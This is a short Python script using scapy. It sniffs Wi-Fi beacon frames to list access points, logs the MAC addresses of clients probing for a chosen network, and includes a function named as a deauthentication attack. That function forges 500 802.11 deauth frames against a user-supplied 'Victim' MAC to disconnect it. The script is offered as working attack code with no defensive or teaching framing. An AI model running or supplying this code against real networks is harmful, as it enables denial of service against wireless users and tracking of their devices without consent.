from scapy.all import *
import scapy
import sys

def ssidsniff():
    ap_list = []
    def Packet_info(pkt):
        if pkt.haslayer(scapy.Dot11):
            if pkt.type == 0 and pkt.subtype == 8:
                if pkt.addr2 not in ap_list:
                    ap_list.append(pkt.addr2)
                    print("SSID:", (pkt.addr2, pkt.info))

    sniff(iface="mon0", prn=Packet_info)


def accesspnt():
    probe_list = []
    ap_name = input("Enter the name of the access point: ")
    def Probe_info(pkt):
        if pkt.haslayer(scapy.Dot11ProbeReq):
            client_name = pkt.info
            if client_name == ap_name:
                if pkt.addr2 not in probe_list:
                    print("New Probe request--", client_name)
                    print("MAC is --", pkt.addr2)
                    probe_list.append(pkt.addr2)
    sniff(iface="mon0", prn=Probe_info)


def deautattack():
    BSSID = input("Enter MAC address of the Access Point: ")
    vctm_mac = input("Enter MAC address of the Victim: ")

    frame = scapy.RadioTap() / scapy.Dot11(addr1=vctm_mac, addr2=BSSID, addr3=BSSID) / scapy.Dot11Deauth()

    sendp(frame, iface="mon0", count=500, inter=0.1)
